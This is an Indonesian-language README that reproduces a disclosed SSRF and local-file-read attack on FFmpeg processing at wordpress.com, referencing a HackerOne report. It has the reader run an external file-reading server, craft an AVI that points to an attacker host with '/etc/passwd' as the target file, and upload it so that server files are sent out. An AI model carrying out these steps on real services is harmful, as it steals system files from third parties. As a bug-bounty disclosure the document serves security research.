# SSRF-ffmpeg
1.Dapatkan droplet / VPS / apapun dengan IP eksternal. Luncurkan skrip saya seperti ini: python3 file_reading_server.py --external-addr <external-ip-of-your-server> --port 8080(Anda memerlukan python3.5).
2.Seperti di SSRF repro langkah 1, memodifikasi http_q.avisehingga link di dalamnya akan mengarah ke server Anda dan menjadi seperti ini: http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd. Anda dapat mengganti /etc/passwddengan nama file lain jika Anda mau.
3.Seperti di repro SSRF langkah 2, unggah file yang dihasilkan ke wordpress.com dan klik "Edit". Setelah beberapa saat, beberapa keluaran debug dari skrip saya akan dicetak ke konsol (karena permintaan SSRF). Tunggu sampai keluarannya berhenti. Kemudian periksa arah kerja skrip. Ini akan berisi file dengan nama seperti ini: <some random string>_<filename-without-slashes>. Isi file ini diterima dari node yang menjalankan FFmpeg.
  
  reports: https://hackerone.com/reports/237381
